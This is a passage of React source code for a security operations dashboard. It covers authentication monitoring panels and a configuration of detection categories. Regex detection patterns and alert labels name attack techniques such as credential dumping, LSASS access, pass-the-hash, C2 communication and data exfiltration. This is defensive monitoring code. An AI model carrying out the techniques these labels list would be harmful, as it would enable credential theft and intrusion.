              <SocMiniTable columns={[{ key: 'process', label: 'Process', bold: true }, { key: 'connections', label: 'Connections' }, { key: 'sent', label: 'Sent' }, { key: 'received', label: 'Received' }]} widths="1.2fr .8fr .8fr .8fr" rows={processRows.map((r) => ({ process: r.label, connections: shortNum(r.value), sent: 'live', received: 'live' }))} />
            </MonitorPanel>
            <MonitorPanel title="PORT ACTIVITY (Top 5)">
              <SocMiniTable columns={[{ key: 'port', label: 'Port', bold: true }, { key: 'protocol', label: 'Protocol' }, { key: 'connections', label: 'Connections' }]} widths=".6fr .8fr 1fr" rows={portRows.map(row => ({ port: row.label, protocol: 'TCP/UDP', connections: shortNum(row.value) }))} />
            </MonitorPanel>
            <MonitorPanel title="LATERAL MOVEMENT DETECTION">
              <SocMiniTable columns={[{ key: 'source', label: 'Source', bold: true }, { key: 'destination', label: 'Destination' }, { key: 'protocol', label: 'Protocol' }, { key: 'time', label: 'Time' }, { key: 'status', label: 'Status', color: () => MON.red, bold: true }]} widths="1fr 1fr .7fr .8fr .8fr" rows={lateralRows.map(a => ({ source: netHost(a), destination: netDest(a), protocol: a.protocol || 'TCP', time: a.createdAt ? new Date(a.createdAt).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) : '—', status: 'Suspicious' }))} />
            </MonitorPanel>
          </div>
          {loading && <div style={{ color: MON.muted, fontSize: 11, textAlign: 'right' }}>Loading network activity...</div>}
        </div>
      </div>
    </SocDashboardShell>
  );
}

// 🛡️ 4. User & Authentication Monitoring popup UI
function AuthenticationMonitoringDashboardPanel({ alerts = [], loading = false, total = 0 }) {
  const navigate = useNavigate();
  const [loginAnalytics, setLoginAnalytics] = useState(null);
  useEffect(() => {
    let active = true;
    api.get('/auth/login-analytics')
      .then(response => { if (active) setLoginAnalytics(response.data || null); })
      .catch(() => { if (active) setLoginAnalytics(null); });
    return () => { active = false; };
  }, []);
  const platformActionLabels = {
    login_success: 'Portal login succeeded',
    login_failed: 'Portal login failed',
    logout: 'Portal logout',
    otp_verified: 'MFA verification succeeded',
    otp_failed: 'MFA verification failed',
    otp_required: 'MFA verification required',
    password_changed: 'Password changed',
    password_reset: 'Password reset',
  };
  const platformEvents = (loginAnalytics?.recentActivity || []).map(activity => ({
    _id: `platform-${activity._id}`,
    createdAt: activity.createdAt,
    username: activity.email || 'unknown',
    srcip: activity.ipAddress,
    geoCountry: activity.geoCountry,
    geoCity: activity.geoCity,
    userAction: activity.action,
    ruleId: `PLATFORM_${String(activity.action || 'AUTH_EVENT').toUpperCase()}`,
    description: platformActionLabels[activity.action] || String(activity.action || 'Authentication event').replaceAll('_', ' '),
    severity: activity.success ? 'low' : 'medium',
    status: activity.success ? 'Resolved' : 'New',
    agentName: 'SOC Portal',
    rawEvent: {
      raw: {
        auth_action: activity.action,
        auth_method: /otp/.test(activity.action || '') ? 'MFA' : 'Password',
      },
    },
  }));
  const sorted = [...alerts, ...platformEvents].sort((a, b) => new Date(b.createdAt || 0) - new Date(a.createdAt || 0));
  const rows = sorted.slice(0, 8);
  const actionText = (a = {}) => `${a.userAction || ''} ${a.ruleId || ''} ${a.description || ''} ${a.status || ''} ${a.rawEvent?.message || ''} ${a.rawEvent?.raw?.auth_action || ''} ${a.rawEvent?.raw?.auth_method || ''}`.toLowerCase();
  const isFailed = (a) => /fail|failed|brute|invalid|denied|lockout/.test(actionText(a));
  const isLocked = (a) => /lockout|locked|account_lockout/.test(actionText(a));
  const isSuccess = (a) => /success(?:ful)?|accepted|auth_success|login_success|ssh_login|otp_verified|remote_login/.test(actionText(a)) && !isFailed(a);
  const isMfa = (a) => /mfa|2fa|otp|totp/.test(actionText(a));
  const isMfaFailure = (a) => isMfa(a) && /fail|failed|denied|bypass|invalid/.test(actionText(a));
  const isPriv = (a) => /priv|sudo|escalat|admin/.test(actionText(a));
  const isLoginLike = (a) => isSuccess(a) || isFailed(a) || /logout|session|remote_login/.test(actionText(a));
  const platform30d = loginAnalytics?.period30d || {};
  const platformFailed = Number(platform30d.login_failed || 0);
  const platformMfaFailures = Number(platform30d.otp_failed || 0);
  const platformSuccessful = Number(platform30d.login_success || 0);
  const failureReasons = loginAnalytics?.failureReasons30d || {};
  const platformLocked = Object.entries(failureReasons)
    .filter(([reason]) => /lock|too_many|disabled/i.test(reason))
    .reduce((sum, [, count]) => sum + Number(count || 0), 0);
  const failed = alerts.filter(isFailed).length + platformFailed;
  const successful = alerts.filter(isSuccess).length + platformSuccessful;
  const locked = alerts.filter(isLocked).length + platformLocked;
  const mfaFailures = alerts.filter(isMfaFailure).length + platformMfaFailures;
  const totalLogins = successful + failed;
  const uniqueUsers = new Set([
    ...alerts.map(a => a.username || a.rawEvent?.username || a.rawEvent?.user),
    ...(loginAnalytics?.perUserStats || []).map(row => row.email),
  ].filter(Boolean)).size;
  const uniqueSessions = new Set(sorted.filter(a => isSuccess(a) && !/logout|session closed|ended/.test(actionText(a))).map(a => `${a.username || a.rawEvent?.username || a.rawEvent?.user || 'user'}:${a.srcip || a.agentName || a.systemId?._id || a.hostname || 'host'}`).filter(Boolean)).size;
  const successSeries = hourlySeriesFromAlerts(sorted.filter(isSuccess));
  const failedSeries = hourlySeriesFromAlerts(sorted.filter(isFailed));
  const uniqueSeries = hourlySeriesFromAlerts(sorted, () => 1);
  const endpointMethods = groupCounts(alerts, a => {
    const text = actionText(a);
    if (/mfa|2fa|otp|totp/.test(text)) return 'MFA';
    if (/sso|saml|oauth/.test(text)) return 'SSO';
    if (/cert|key|ssh/.test(text)) return 'Certificate';
    if (/sudo|pam/.test(text)) return 'PAM / Sudo';
    return 'Password';
  }, 5);
  const methodCounts = new Map(endpointMethods.map(row => [row.label, Number(row.value || 0)]));
  methodCounts.set('Password', (methodCounts.get('Password') || 0) + platformSuccessful + platformFailed);
  methodCounts.set('MFA', (methodCounts.get('MFA') || 0) + Number(platform30d.otp_verified || 0) + platformMfaFailures);
  const methods = [...methodCounts.entries()]
    .map(([label, value]) => ({ label, value }))
    .filter(row => row.value > 0)
    .sort((a, b) => b.value - a.value)
    .slice(0, 5);
  const locationCounts = new Map();
  const addLocation = (country, city, count = 1) => {
    const cleanCountry = String(country || '').trim();
    if (!cleanCountry) return;
    const cleanCity = String(city || '').trim();
    const key = `${cleanCity}\u0000${cleanCountry}`;
    const current = locationCounts.get(key) || { country: cleanCountry, city: cleanCity, value: 0 };
    current.value += Number(count || 0);
    locationCounts.set(key, current);
  };
  (loginAnalytics?.locations30d || []).forEach(row => addLocation(row.country, row.city, row.count));
  alerts.filter(isLoginLike).forEach(alert => addLocation(alert.geoCountry || alert.rawEvent?.country, alert.geoCity || alert.rawEvent?.city, 1));
  const geos = [...locationCounts.values()]
    .sort((a, b) => b.value - a.value)
    .slice(0, 6)
    .map(row => ({ ...row, label: [row.city, row.country].filter(Boolean).join(', ') }));
  const locationMapPoints = authLocationMapPoints(geos);
  const alertRows = sorted.filter(a => severityRank(a.severity) >= 2 || isFailed(a) || isPriv(a)).slice(0, 5);
  const statusLabel = (a) => isFailed(a) ? 'Failed' : isSuccess(a) ? 'Success' : isPriv(a) ? 'Privileged' : 'Event';
  const methodLabel = (a) => {
    const text = actionText(a);
    if (/mfa|2fa|otp|totp/.test(text)) return 'MFA';
    if (/sso|saml|oauth/.test(text)) return 'SSO';
    if (/cert|key|ssh/.test(text)) return 'Certificate';
    if (/sudo|pam/.test(text)) return 'PAM / Sudo';
    return 'Password';
  };
  const failedUserMap = new Map();
  (loginAnalytics?.failedUsers30d || []).forEach(row => {
    const user = row.email || 'unknown';
    failedUserMap.set(user, { label: user, value: Number(row.count || 0), lastFailed: row.lastFailed });
  });
  alerts.filter(isFailed).forEach(alert => {
    const user = alert.username || alert.rawEvent?.username || alert.rawEvent?.user || 'unknown';
    const current = failedUserMap.get(user) || { label: user, value: 0, lastFailed: null };
    current.value += 1;
    const currentTime = current.lastFailed ? new Date(current.lastFailed).getTime() : 0;
    const next = alert.createdAt ? new Date(alert.createdAt).getTime() : 0;
    if (next >= currentTime) current.lastFailed = alert.createdAt;
    failedUserMap.set(user, current);
  });
  const failedUserRows = [...failedUserMap.values()].sort((a, b) => b.value - a.value).slice(0, 5);
  const accountChangeRows = [
    ['New User Created', alerts.filter(a => /user_created|new user|useradd|adduser|new-localuser|eventid=4720/i.test(actionText(a))).length],
    ['User Modified', alerts.filter(a => /user_modified|usermod|account.*modified|set-localuser|eventid=4738/i.test(actionText(a))).length],
    ['User Deleted', alerts.filter(a => /user_deleted|userdel|remove-localuser|eventid=4726/i.test(actionText(a))).length],
    ['Password Changed', alerts.filter(a => /password[_ ]changed|passwd.*changed|auth_pass_change|eventid=4723/i.test(actionText(a))).length + Number(platform30d.password_changed || 0)],
    ['Password Reset', alerts.filter(a => /password[_ ]reset|eventid=4724/i.test(actionText(a))).length + Number(platform30d.password_reset || 0)],
    ['Privilege Changes', alerts.filter(isPriv).length],
  ].map(([event, count]) => ({ event, count }));
  const authEventRows = [
    ['MFA Success', alerts.filter(a => isMfa(a) && /success|verified/.test(actionText(a))).length + Number(platform30d.otp_verified || 0), MON.green],
    ['MFA Failure', mfaFailures, MON.red],
    ['Password Change', accountChangeRows.find(row => row.event === 'Password Changed')?.count || 0, MON.blue],
    ['Password Reset', accountChangeRows.find(row => row.event === 'Password Reset')?.count || 0, MON.blue],
    ['Account Lockout', locked, MON.red],
    ['Privilege Escalation', alerts.filter(isPriv).length, MON.orange],
  ].map(([event, count, color]) => ({ event, count: shortNum(count), color }));
  const riskyUserMap = new Map();
  const addRisk = (user, count, rank = 2) => {
    if (!user) return;
    const current = riskyUserMap.get(user) || { value: 0, rank: 0 };
    current.value += Number(count || 0);
    current.rank = Math.max(current.rank, rank);
    riskyUserMap.set(user, current);
  };
  alerts.filter(a => severityRank(a.severity) >= 2 || isFailed(a) || isPriv(a)).forEach(alert => {
    addRisk(alert.username || alert.rawEvent?.username || alert.rawEvent?.user || alert.agentName || 'unknown', 1, Math.max(severityRank(alert.severity), isPriv(alert) ? 3 : 2));
  });
  (loginAnalytics?.failedUsers30d || []).forEach(row => addRisk(row.email || 'unknown', row.count, Number(row.count || 0) >= 10 ? 3 : 2));
  const riskyUserRows = [...riskyUserMap.entries()]
    .sort((a, b) => b[1].rank - a[1].rank || b[1].value - a[1].value)
    .slice(0, 5)
    .map(([user, details]) => {
      const risk = details.rank >= 3 || details.value >= 10 ? 'High' : details.value >= 3 ? 'Medium' : 'Low';
      return { user, risk, color: risk === 'High' ? MON.red : risk === 'Medium' ? MON.yellow : MON.green, alerts: details.value };
    });

  return (
    <SocDashboardShell kind="auth" active="Overview">
      <div style={{ overflow: 'auto', padding: 8, background: MON.bg, color: MON.text }}>
        <div style={{ minWidth: 1160, display: 'grid', gap: 8 }}>
          <div style={{ display: 'flex', justifyContent: 'flex-end', alignItems: 'center' }}>
            <AuthCapabilityActions />
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(6, 1fr)', gap: 8 }}>
            <MonitorKpi icon="👥" title="Total Logins" value={shortNum(totalLogins)} change="Live" color={MON.blue} data={uniqueSeries} />
            <MonitorKpi icon="✓" title="Successful Logins" value={shortNum(successful)} change="Live" color={MON.green} data={successSeries} />
            <MonitorKpi icon="🔒" title="Failed Logins" value={shortNum(failed)} change="Live" color={MON.red} danger data={failedSeries} />
            <MonitorKpi icon="🔐" title="Locked Accounts" value={shortNum(locked)} change="Live" color={MON.yellow} danger data={hourlySeriesFromAlerts(alerts.filter(isLocked))} />
            <MonitorKpi icon="👤" title="Active Sessions" value={shortNum(uniqueSessions)} change="Live" color={MON.purple} data={hourlySeriesFromAlerts(alerts.filter(isSuccess))} />
            <MonitorKpi icon="⬟" title="MFA Failures" value={shortNum(mfaFailures)} change="Live" color={MON.red} danger data={hourlySeriesFromAlerts(alerts.filter(isMfaFailure))} />
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: '1.1fr .86fr 1.55fr', gap: 8 }}>
            <MonitorPanel title="AUTHENTICATION OVER TIME">
              <div style={{ padding: 14, height: 207, position: 'relative', backgroundImage: 'linear-gradient(rgba(255,255,255,.04) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,.04) 1px, transparent 1px)', backgroundSize: '48px 34px' }}>
                <div style={{ position: 'absolute', left: 18, top: 10, display: 'flex', gap: 14, color: MON.muted, fontSize: 10, fontWeight: 900 }}><span style={{ color: MON.green }}>● Successful</span><span style={{ color: MON.red }}>● Failed</span></div>
                <svg viewBox="0 0 560 190" width="100%" height="100%" preserveAspectRatio="none">
                  <polyline points={successSeries.map((v, i) => `${(i / 23) * 560},${170 - (v / Math.max(...successSeries, 1)) * 125}`).join(' ')} fill="none" stroke="#00d5c7" strokeWidth="3" />
                  <polyline points={failedSeries.map((v, i) => `${(i / 23) * 560},${170 - (v / Math.max(...failedSeries, 1)) * 95}`).join(' ')} fill="none" stroke={MON.red} strokeWidth="3" />
                </svg>
              </div>
            </MonitorPanel>
            <MonitorPanel title="AUTHENTICATION BY SOURCE">
              <div style={{ display: 'grid', gridTemplateColumns: '150px 1fr', alignItems: 'center', minHeight: 207 }}>
                <Donut value={totalLogins ? 42 : 0} label={shortNum(totalLogins)} color={MON.blue} accent={MON.green} />
                <TinyLegend rows={methods.map((r, i) => [r.label, `${r.value}`, [MON.blue, MON.green, MON.purple, MON.orange, MON.muted][i]])} />
              </div>
            </MonitorPanel>
            <MonitorPanel title="LOGIN ATTEMPTS BY LOCATION">
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 190px', minHeight: 207 }}>
                <SocWorldMap
                  auth
                  height={207}
                  points={locationMapPoints}
                  emptyLabel={geos.length ? 'Location is available in the table.' : 'No geo-enriched login attempts in the last 30 days.'}
                />
                <div style={{ padding: '12px 12px 0' }}>
                  <SocMiniTable
                    columns={[{ key: 'location', label: 'Location' }, { key: 'attempts', label: 'Attempts', color: () => MON.red, bold: true }]}
                    widths="1fr .7fr"
                    rows={geos.map(r => ({ location: r.label, attempts: shortNum(r.value) }))}
                    compact
                    empty="No geo-enriched attempts."
                  />
                </div>
              </div>
            </MonitorPanel>
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr .86fr .78fr', gap: 8 }}>
            <MonitorPanel title="TOP FAILED LOGIN USERS">
              <SocMiniTable
                columns={[{ key: 'user', label: 'User', bold: true }, { key: 'failed', label: 'Failed Attempts', color: () => MON.red }, { key: 'last', label: 'Last Failed' }]}
                widths="1fr .9fr 1fr"
                rows={failedUserRows.map(r => ({ user: r.label, failed: shortNum(r.value), last: r.lastFailed ? new Date(r.lastFailed).toLocaleString([], { month: 'short', day: '2-digit', hour: '2-digit', minute: '2-digit' }) : '-' }))}
                compact
                empty="No failed login events in the last 30 days."
              />
            </MonitorPanel>
            <MonitorPanel title="ACCOUNT CHANGES">
              <SocMiniTable columns={[{ key: 'event', label: 'Event Type', bold: true }, { key: 'count', label: 'Count', color: () => MON.cyan }]} widths="1fr .45fr" rows={accountChangeRows} compact />
            </MonitorPanel>
            <MonitorPanel title="AUTHENTICATION EVENTS">
              <SocMiniTable columns={[{ key: 'event', label: 'Event', bold: true }, { key: 'count', label: 'Count', color: row => row.color, bold: true }]} widths="1fr .5fr" rows={authEventRows} compact />
            </MonitorPanel>
            <MonitorPanel title="RISKY USERS">
              <SocMiniTable columns={[{ key: 'user', label: 'User', bold: true }, { key: 'risk', label: 'Risk Score', color: row => row.color, bold: true }, { key: 'alerts', label: 'Alerts' }]} widths="1fr .75fr .45fr" rows={riskyUserRows} compact empty="No risky users detected." />
            </MonitorPanel>
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: '1.18fr 1.1fr', gap: 8 }}>
            <MonitorPanel title="RECENT AUTHENTICATION EVENTS" right={<button onClick={() => navigate('/edr-dashboard-details/auth/activity')} style={{ border: 0, background: 'none', color: MON.cyan, cursor: 'pointer', fontSize: 10, fontWeight: 900 }}>View All Events →</button>}>
              <SocMiniTable
                columns={[
                  { key: 'time', label: 'Time' },
                  { key: 'user', label: 'User', bold: true },
                  { key: 'event', label: 'Event', color: row => row.eventColor, bold: true },
                  { key: 'source', label: 'Source' },
                  { key: 'ip', label: 'IP Address' },
                  { key: 'location', label: 'Location' },
                  { key: 'status', label: 'Status', color: row => row.statusColor, bold: true },
                ]}
                widths=".8fr .85fr 1.05fr .75fr .95fr 1fr .7fr"
                rows={rows.slice(0, 5).map((a) => {
                  const status = statusLabel(a);
                  return {
                    time: a.createdAt ? new Date(a.createdAt).toLocaleString([], { month: 'short', day: '2-digit', hour: '2-digit', minute: '2-digit' }) : '-',
                    user: a.username || a.rawEvent?.username || 'unknown',
                    event: a.description || a.ruleId || a.userAction || 'Authentication event',
                    eventColor: status === 'Failed' ? MON.red : status === 'Success' ? MON.text : MON.yellow,
                    source: a.agentName || a.hostname || '-',
                    ip: a.srcip || '-',
                    location: [a.geoCity, a.geoCountry].filter(Boolean).join(', ') || '-',
                    status,
                    statusColor: status === 'Success' ? MON.green : status === 'Failed' ? MON.red : MON.yellow,
                  };
                })}
              />
            </MonitorPanel>
            <MonitorPanel title="TOP SECURITY ALERTS" right={<button onClick={() => navigate('/edr-dashboard-details/auth/alerts')} style={{ border: 0, background: 'none', color: MON.cyan, cursor: 'pointer', fontSize: 10, fontWeight: 900 }}>View All Alerts →</button>}>
              <SocMiniTable
                columns={[{ key: 'alert', label: 'Alert', bold: true }, { key: 'severity', label: 'Severity', color: row => row.color, bold: true }, { key: 'time', label: 'Time' }, { key: 'status', label: 'Status', color: () => MON.red, bold: true }]}
                widths="1.45fr .7fr 1fr .75fr"
                rows={alertRows.slice(0, 5).map((a) => ({ alert: a.description || a.ruleId, severity: a.severity || 'Low', color: severityRank(a.severity) >= 3 || /critical/i.test(a.severity || '') ? MON.red : MON.yellow, time: a.createdAt ? new Date(a.createdAt).toLocaleString([], { month: 'short', day: '2-digit', hour: '2-digit', minute: '2-digit' }) : '-', status: a.status || 'New' }))}
              />
            </MonitorPanel>
          </div>
          {loading && <div style={{ color: MON.muted, fontSize: 11, textAlign: 'right' }}>Loading authentication events...</div>}
        </div>
      </div>
    </SocDashboardShell>
  );
}

// 🛡️ DASHBOARD CONFIG: popup UI data by image/card name
const CAPABILITY_DASHBOARD_CONFIG = {
  // 🛡️ 5. Memory Activity Monitoring config
  5: {
    name: 'Memory Activity Monitoring',
    accent: MON.green,
    danger: MON.red,
    kpis: ['Total Memory Usage', 'Top Memory Process', 'Suspicious Events', 'Critical Alerts', 'At Risk Endpoints'],
    sections: ['Top Memory Consuming Processes', 'Memory Usage Over Time', 'Real-Time Memory Alerts'],
    categories: ['Process Injection', 'DLL Injection', 'Remote Thread', 'Process Hollowing', 'LSASS Access', 'Memory Dump', 'Credential Dumping', 'Fileless Malware', 'In-Memory Payload', 'Shellcode Execution', 'Reflective DLL', 'PowerShell (Memory)', 'Encoded Script', 'RWX Memory', 'API Hooking', 'DLL Sideloading'],
    table: ['Process Injection Detected', 'LSASS Memory Access', 'Memory Dump Attempt', 'RWX Memory Region', 'Suspicious DLL Loaded'],
  },
  // 🛡️ 6. Registry Monitoring config
  6: {
    name: 'Registry Monitoring',
    accent: MON.blue,
    danger: MON.red,
    kpis: ['Total Alerts', 'Critical', 'High', 'Medium', 'Low', 'Total Systems'],
    sections: ['Windows Registry Monitoring', 'Linux Configuration Monitoring', 'Solaris Monitoring', 'Recent Critical Alerts'],
    categories: ['Startup / Persistence', 'Security Configuration', 'User & Authentication', 'Logging / System', 'Network Configuration', 'Software & Execution', 'Service Monitoring', 'Filesystem Monitoring'],
    table: ['Run Key Modified', 'New Admin User Created', 'Firewall Disabled', 'Cron Job Added', 'SSH Config Modified'],
  },
  // 🛡️ 7. System Changes Monitoring config
  7: {
    name: 'System Changes Monitoring',
    accent: MON.blue,
    danger: MON.red,
    kpis: ['Total Changes', 'Critical Changes', 'High Changes', 'Medium Changes', 'Low Changes', 'Affected Systems'],
    sections: ['Changes Over Time', 'Changes by Category', 'Changes by OS', 'Recent Critical Changes'],
    categories: ['System Files', 'User Accounts', 'Services', 'Registry/Config', 'Security Policies', 'Network Config', 'Scheduled Task', 'Others'],
    table: ['User Created', 'File Modified', 'Registry Change', 'Service Created', 'Group Policy Modified'],
  },
  // 🛡️ 8. Persistence Mechanism Detection config
  8: {
    name: 'Persistence Mechanism Detection',
    accent: MON.red,
    danger: MON.red,
    kpis: ['Persistence Alerts', 'High Severity Alerts', 'Medium Severity Alerts', 'Low Severity Alerts', 'Affected Endpoints', 'Unique Techniques'],
    sections: ['Persistence Alerts Over Time', 'Alerts by Persistence Category', 'Alerts by Severity', 'Recent Persistence Alerts'],
    categories: ['Scheduled Tasks / Cron', 'Services', 'Registry Persistence', 'User Accounts', 'WMI Persistence', 'PowerShell Persistence', 'Startup Items', 'Others'],
    table: ['Suspicious Scheduled Task', 'New Service Installed', 'Registry Run Key Added', 'WMI Event Consumer', 'Encoded PowerShell Command'],
  },
  // 🛡️ 9. Web & DNS Monitoring config
  9: {
    name: 'Web & DNS Monitoring',
    accent: MON.purple,
    danger: MON.red,
    kpis: ['Total Web Requests', 'Total DNS Queries', 'Blocked Web Requests', 'Blocked DNS Queries', 'Malicious Requests', 'Unique Domains Queried'],
    sections: ['Web Traffic Over Time', 'DNS Queries Over Time', 'Top Alert Categories', 'Recent Alerts'],
    categories: ['Malicious Domain', 'Phishing', 'C2 Communication', 'DNS Tunneling', 'Data Exfiltration', 'Other'],
    table: ['Malicious Domain Detected', 'DNS Tunneling Activity', 'Phishing Website Access', 'C2 Communication Detected', 'Unusual DNS Query Spike'],
  },
  // 🛡️ 10. Device Control (USB) Monitoring config
  10: {
    name: 'Device Control (USB) Monitoring',
    accent: MON.blue,
    danger: MON.red,
    kpis: ['USB Connections', 'Authorized Devices', 'Unauthorized Devices', 'Policy Violations', 'Data Copied to USB'],
    sections: ['USB Activity Timeline', 'Top USB Devices (by Usage)', 'Device Connection Status', 'Recent USB Events'],
    categories: ['Documents', 'Spreadsheets', 'Presentations', 'Archives', 'Others', 'Blocked Transfers'],
    table: ['Device Connected', 'File Copied to USB', 'Device Blocked', 'Device Connected', 'File Copied from USB'],
  },
  // 🛡️ 11. Behavioral Analytics (UEBA) config
  11: {
    name: 'Behavioral Analytics (UEBA)',
    accent: MON.orange,
    danger: MON.red,
    kpis: ['Risky Events', 'High Risk Users', 'Anomalous Devices', 'Data Exfiltration Risk', 'UEBA Alerts'],
    sections: ['Anomalous Events Over Time', 'Top UEBA Alerts', 'Behavior Risk Distribution', 'Top Risky Users'],
    categories: ['User Behavior', 'Endpoint Behavior', 'Network Behavior', 'Data Access', 'Authentication', 'Cloud Activity', 'Email Behavior', 'Application Behavior'],
    table: ['Impossible Travel Detected', 'Large Data Download', 'Unusual Admin Activity', 'Multiple Failed Logins', 'Access from Unusual Location'],
  },
  // 🛡️ 12. Log Monitoring & Correlation config
  12: {
    name: 'Log Monitoring & Correlation',
    accent: MON.blue,
    danger: MON.red,
    kpis: ['Total Logs Ingested', 'Critical Alerts', 'Active Incidents', 'Correlation Rules Fired', 'Resolved Incidents', 'Mean Time to Detect'],
    sections: ['Failed Login Trends', 'Top Log Sources', 'Top Alert Categories', 'Recent Correlated Incidents'],
    categories: ['Authentication', 'Malware / EDR', 'Privilege Escalation', 'Data Exfiltration', 'Lateral Movement', 'Policy Violation'],
    table: ['Brute Force Success', 'Admin Login from New IP', 'PowerShell + Outbound', 'DNS Suspicious Domain', 'Data Exfiltration'],
  },
  // 🛡️ 13. Data Security Monitoring config
  13: {
    name: 'Data Security Monitoring',
    accent: MON.blue,
    danger: MON.red,
    kpis: ['Total Data Events', 'Critical Alerts', 'High Risk Events', 'Data Exfiltration Attempts', 'Policy Violations', 'Protected Data (GB)'],
    sections: ['Events Over Time', 'Data Events by Category', 'Top Data Exfiltration Channels', 'Recent Critical Alerts'],
    categories: ['Data Access', 'Data Transfer', 'File Operations', 'Policy Violations', 'Other Events', 'Classified Data'],
    table: ['Large File Upload to External Site', 'Unauthorized Access to Finance Data', 'Data Exfiltration via USB', 'Mass Download Detected', 'Unusual Database Export'],
  },
  // 🛡️ 14. Credential Security Monitoring config
  14: {
    name: 'Credential Security Monitoring',
    accent: MON.green,
    danger: MON.red,
    kpis: ['Failed Login Attempts', 'Successful Logins', 'Brute Force Attempts', 'Privileged Logins', 'Password Resets', 'High Risk Alerts'],
    sections: ['Authentication Overview', 'Login Attempts by Location', 'Top Risky Users', 'Recent High Risk Events'],
    categories: ['Brute Force', 'Privileged Access', 'Credential Theft', 'Account Takeover', 'Policy Violation', 'Other'],
    table: ['Impossible Travel', 'Brute Force Attempt', 'Suspicious Token Use', 'Privileged Login', 'Password Reset'],
  },
  // 🛡️ 15. Exploit Detection config
  15: {
    name: 'Exploit Detection',
    accent: MON.red,
    danger: MON.red,
    kpis: ['Critical Alerts', 'High Severity', 'Medium Severity', 'Low Severity', 'Total Alerts'],
    sections: ['Exploit Alerts Over Time', 'Exploit Attacks by Category', 'Top Attack Types', 'Recent Exploit Alerts'],
    categories: ['Web Exploits', 'RCE Attempts', 'Privilege Escalation', 'Network Exploits', 'Endpoint Exploits', 'Others'],
    table: ['RCE Attempt Detected', 'SQL Injection Attempt', 'Privilege Escalation', 'Command Injection', 'XSS Attempt Detected'],
  },
  // 🛡️ 16. Lateral Movement Detection config
  16: {
    name: 'Lateral Movement Detection',
    accent: MON.red,
    danger: MON.red,
    kpis: ['Overall Security Score', 'Total Alerts', 'Critical Alerts', 'High Alerts', 'Medium Alerts', 'Low Alerts'],
    sections: ['Alerts Over Time', 'Alerts by Severity', 'Top Alert Categories', 'Recent Critical Alerts'],
    categories: ['RDP Sessions', 'SMB Connections', 'WMI Executions', 'PsExec Activities', 'PowerShell Remoting', 'Pass-the-Hash', 'Kerberos Abuse', 'Admin Shares'],
    table: ['Possible Pass-the-Hash Attack Detected', 'Multiple Failed Logins Followed by Success', 'Suspicious PowerShell Execution', 'Abnormal SMB Access to ADMIN$ Share', 'Possible Kerberos Ticket Manipulation'],
  },
  // 🛡️ 17. Threat Intelligence Monitoring config
  17: {
    name: 'Threat Intelligence Monitoring',
    accent: MON.purple,
    danger: MON.red,
    kpis: ['Threat Intel Matches', 'High Confidence IOCs', 'New Campaigns', 'Blocked Indicators', 'Assets Matched', 'Feeds Active'],
    sections: ['Threat Intel Matches Over Time', 'IOC Match Distribution', 'Top Threat Categories', 'Recent Threat Intel Matches'],
    categories: ['Malicious IPs', 'Malicious Domains', 'File Hashes', 'C2 Infrastructure', 'Ransomware Campaigns', 'Phishing Kits', 'Exploit IOCs', 'Suspicious URLs'],
    table: ['Malicious IP Match Detected', 'Known C2 Domain Queried', 'Ransomware IOC Matched', 'Suspicious URL Accessed', 'Threat Feed Indicator Updated'],
  },
  // 🛡️ 18. Email Threat Monitoring config
  18: {
    name: 'Email Threat Monitoring',
    accent: MON.blue,
    danger: MON.red,
    kpis: ['Total Emails Received', 'Phishing Emails Detected', 'Malicious Attachments', 'Quarantined Emails', 'Blocked Emails', 'SPF/DKIM/DMARC Failures'],
    sections: ['Email Traffic Over Time', 'Threat Categories', 'Top Malicious Domains', 'Recent Email Threats'],
    categories: ['Phishing', 'Malware', 'Spam', 'BEC / Fraud', 'Credential Theft', 'Malicious Attachments', 'Quarantine', 'Blocked Senders'],
    table: ['Phishing Link Detected', 'Malicious Attachment Blocked', 'Spoofed Sender Failed DMARC', 'Credential Harvesting Attempt', 'BEC Wire Transfer Attempt'],
  },
  // 🛡️ 19. Insider Threat Detection config
  19: {
    name: 'Insider Threat Detection',
    accent: MON.orange,
    danger: MON.red,
    kpis: ['Total Users Monitored', 'High Risk Users', 'Insider Threat Alerts', 'Data Exfiltration Attempts', 'Privileged Activities', 'UEBA Risk Score'],
    sections: ['Insider Threat Alerts Timeline', 'Alerts by Category', 'Recent High Risk Alerts', 'Data Exfiltration Attempts'],
    categories: ['Data Exfiltration', 'Privilege Misuse', 'Unauthorized Access', 'Policy Violation', 'USB Copy', 'Cloud Upload', 'After-Hours Access', 'Sensitive File Access'],
    table: ['Mass File Download Detected', 'Large Data Upload to Cloud', 'Privilege Escalation Attempt', 'USB Copy of Sensitive Data', 'Access to Restricted Resource'],
  },
  // 🛡️ 20. Patch & Vulnerability Monitoring config
  20: {
    name: 'Patch & Vulnerability Monitoring',
    accent: MON.green,
    danger: MON.red,
    kpis: ['Critical Vulnerabilities', 'High Vulnerabilities', 'Medium Vulnerabilities', 'Low Vulnerabilities', 'Patch Compliance', 'Assets Monitored'],
    sections: ['Vulnerabilities Over Time', 'Vulnerability Severity Distribution', 'Top Vulnerable Assets', 'Recent Alerts'],
    categories: ['Servers', 'Workstations', 'Network Devices', 'Applications', 'Cloud Resources', 'Missing Critical Patches', 'Patch Deployment', 'Vulnerability Aging'],
    table: ['Critical CVE Detected', 'Patch Installation Failed', 'Asset Missing Critical Patch', 'Vulnerability Older Than 30 Days', 'Unsupported OS Detected'],
  },
  // 🛡️ 21. Sandbox Analysis config
  21: {
    name: 'Sandbox Analysis',
    accent: MON.blue,
    danger: MON.red,
    kpis: ['Total Submissions', 'Malicious', 'Suspicious', 'Clean', 'High Risk Detections'],
    sections: ['Threat Severity Trend', 'File Analysis Summary', 'Top Malicious Files', 'Behavior Summary'],
    categories: ['Executables (EXE)', 'Scripts', 'Documents', 'Archives', 'Process Injection', 'Registry Changes', 'Network Connections', 'MITRE Techniques'],
    table: ['Malware Downloader Detected', 'Trojan.Generic Verdict', 'Suspicious PowerShell Behavior', 'C2 Connection Detected', 'Registry Persistence Detected'],
  },
  // 🛡️ 22. Kernel-Level Monitoring config
  22: {
    name: 'Kernel-Level Monitoring',
    accent: MON.purple,
    danger: MON.red,
